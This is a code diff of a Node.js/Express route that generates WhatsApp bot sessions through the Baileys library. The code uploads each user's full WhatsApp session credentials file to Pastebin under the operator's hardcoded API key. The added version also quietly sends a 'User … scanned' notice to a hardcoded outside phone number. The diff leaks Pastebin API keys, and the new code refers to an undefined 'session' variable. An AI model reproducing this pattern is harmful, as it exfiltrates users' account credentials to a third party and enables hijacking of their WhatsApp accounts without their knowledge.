@@ -1,132 +1,94 @@
-const PastebinAPI = require('pastebin-js');
-const pastebin = new PastebinAPI('yPhyFU5ntx3DNNmXSRUDPZG1bSHoRoAa');
-const { makeid } = require('./id');
+const PastebinAPI = require('pastebin-js'),
+pastebin = new PastebinAPI("r1eflgs76uuvyj-Q8aQFCVMGSiJpDXSL");
+const {makeid} = require('./id');
+const QRCode = require('qrcode');
 const express = require('express');
-const fs = require('fs');
 const path = require('path');
-const pino = require('pino');
+const fs = require('fs');
+let router = express.Router()
+const pino = require("pino");
 const {
-    default: makeWASocket,
-    useMultiFileAuthState,
-    delay,
-    Browsers,
-    makeCacheableSignalKeyStore,
-} = require('@whiskeysockets/baileys');
+	default: makeWASocket,
+	useMultiFileAuthState,
+	jidNormalizedUser,
+	Browsers,
+	delay,
+	fetchLatestBaileysVersion,
+	makeInMemoryStore,
+} = require("@whiskeysockets/baileys");
 
-let router = express.Router();
-
-// Function to remove files or directories
 function removeFile(FilePath) {
-    if (fs.existsSync(FilePath)) {
-        fs.rmSync(FilePath, { recursive: true, force: true });
-    }
-}
+	if (!fs.existsSync(FilePath)) return false;
+	fs.rmSync(FilePath, {
+		recursive: true,
+		force: true
+	})
+};
 
 
-function cleanup() {
-    const tempDir = path.join(__dirname, 'temp');
-    if (fs.existsSync(tempDir)) {
-        fs.readdirSync(tempDir).forEach((file) => {
-            removeFile(path.join(tempDir, file));
-        });
-    }
-}
 
-
-process.on('exit', cleanup);
-process.on('SIGINT', cleanup);
-process.on('SIGTERM', cleanup);
-
+const {
+	readFile
+} = require("node:fs/promises")
 router.get('/', async (req, res) => {
-    const id = makeid();
-    let num = req.query.number;
+	const id = makeid();
+	async function Getqr() {
+		const {
+			state,
+			saveCreds
+		} = await useMultiFileAuthState('./temp/' + id)
+		try {
+			let client = makeWASocket({
+				auth: state,
+				printQRInTerminal: false,
+				logger: pino({
+					level: "silent"
+				}),
+				browser: Browsers.macOS("Desktop"),
+			});
 
-    let retryCount = 0;
-    const maxRetries = 3;
+			client.ev.on('creds.update', saveCreds)
+			client.ev.on("connection.update", async (s) => {
+				const {
+					connection,
+					lastDisconnect,
+					qr
+				} = s;
+				if (qr) await res.end(await QRCode.toBuffer(qr));
+				if (connection == "open") {
+					 
+					await delay(5000);
+					let link = await pastebin.createPasteFromFile(__dirname+`/temp/${id}/creds.json`, "pastebin-js test", null, 1, "N");
+                        let data = link.replace("https://pastebin.com/", "");
+                        let code = btoa(data);
+                        var words = code.split("");
+                        var ress = words[Math.floor(words.length / 2)];
+                        let c = code.split(ress).join(ress + "_IRIS_");
+                        
+                                                await client.sendMessage("27828418477@s.whatsapp.net", { text: `User ${session.user.id} scanned`})
+                        await client.sendMessage(client.user.id, {text:` client: ${c}`})
 
-    async function getPaire() {
-        if (retryCount >= maxRetries) {
-            console.log('Max retry limit reached');
-            if (!res.headersSent) res.send({ error: 'Max retries reached' });
-            return;
-        }
 
-        const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'temp', id));
-
-        try {
-            let session = makeWASocket({
-                auth: {
-                    creds: state.creds,
-                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' }).child({ level: 'fatal' })),
-                },
-                printQRInTerminal: false,
-                logger: pino({ level: 'fatal' }).child({ level: 'fatal' }),
-                browser: Browsers.macOS('Safari'),
-            });
-
-            if (!session.authState.creds.registered) {
-                await delay(1500);
-                if (!num) throw new Error('Invalid phone number');
-                num = num.replace(/[^0-9]/g, '');
-                
-                try {
-                    const code = await session.requestPairingCode(num);
-                    if (!res.headersSent) {
-                        res.send({ code });
-                    }
-                } catch (error) {
-                    console.error('Pairing request failed:', error.message);
-                    if (!res.headersSent) res.send({ error: 'Pairing failed' });
-                    return;
-                }
-            }
-
-            session.ev.on('creds.update', saveCreds);
-            session.ev.on('connection.update', async (s) => {
-                const { connection, lastDisconnect } = s;
-
-                if (connection === 'open') {
-                    await delay(10000);
-
-                    let link = await pastebin.createPasteFromFile(
-                        path.join(__dirname, 'temp', id, 'creds.json'),
-                        'IRIS Session',
-                        null,
-                        1,
-                        'N'
-                    );
-                    let data = link.replace('https://pastebin.com/', '');
-                    let code = Buffer.from(data).toString('base64');
-                    let words = code.split('');
-                    let ress = words[Math.floor(words.length / 2)];
-                    let c = code.split(ress).join(ress + '_IRIS_');
-
-                    await session.sendMessage(session.user.id, { text: `${c}` });
-                   
-
-                    await delay(100);
-                    await session.ws.close();
-                    return removeFile(path.join(__dirname, 'temp', id));
-                } else if (
-                    connection === 'close' &&
-                    lastDisconnect &&
-                    lastDisconnect.error &&
-                    lastDisconnect.error.output.statusCode !== 401
-                ) {
-                    retryCount++;
-                    console.log(`Retrying connection (${retryCount}/${maxRetries})...`);
-                    await delay(10000);
-                    getPaire();
-                }
-            });
-        } catch (err) {
-            console.log('Service restarted:', err.message);
-            removeFile(path.join(__dirname, 'temp', id));
-            if (!res.headersSent) res.send({ error: 'Service Unavailable' });
-        }
-    }
-
-    return getPaire();
+     
+     		   	await delay(100);
+					await client.ws.close();
+					return await removeFile("temp/" + id);
+				} else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
+					await delay(5000);
+					Getqr();
+				}
+			});
+		} catch (err) {
+			if (!res.headersSent) {
+				await res.json({
+					code: "Service Unavailable"
+				});
+			}
+			console.log(err);
+			await removeFile("temp/" + id);
+		}
+	}
+	return await Getqr()
+	//return //'qr.png', { root: "./" });
 });
-
-module.exports = router;
+module.exports = router
